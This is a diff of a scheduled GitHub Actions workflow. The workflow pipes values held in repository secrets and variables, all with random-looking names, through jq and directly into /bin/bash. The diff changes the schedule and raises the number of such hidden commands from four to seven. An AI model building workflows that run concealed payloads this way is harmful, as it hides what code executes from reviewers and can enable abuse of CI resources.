@@ -1,9 +1,8 @@
 name: xiezhen19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
+    - cron: '32 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiezhen19871010
         env:
-          mushe3295: ${{ secrets.mushe3295 }}
+          o56544: ${{ secrets.o56544 }}
         run: |
-          echo $mushe3295 | jq -r .ewcf874 | /bin/bash
-          echo $jjxab903 | jq -r .nvqz3 | /bin/bash
-          echo $jl4 | jq -r .po76 | /bin/bash
-          echo $nkwk906 | jq -r .dqr18 | /bin/bash
+          echo $o56544 | jq -r .fk06860 | /bin/bash
+          echo $lzl7313 | jq -r .cey00 | /bin/bash
+          echo $lcy76983 | jq -r .k59173 | /bin/bash
+          echo $xgynk524 | jq -r .hv922 | /bin/bash
+          echo $o37 | jq -r .sacf11018 | /bin/bash
+          echo $vsva8689 | jq -r .zhg0 | /bin/bash
+          echo $qle8573 | jq -r .zzfim316 | /bin/bash
 
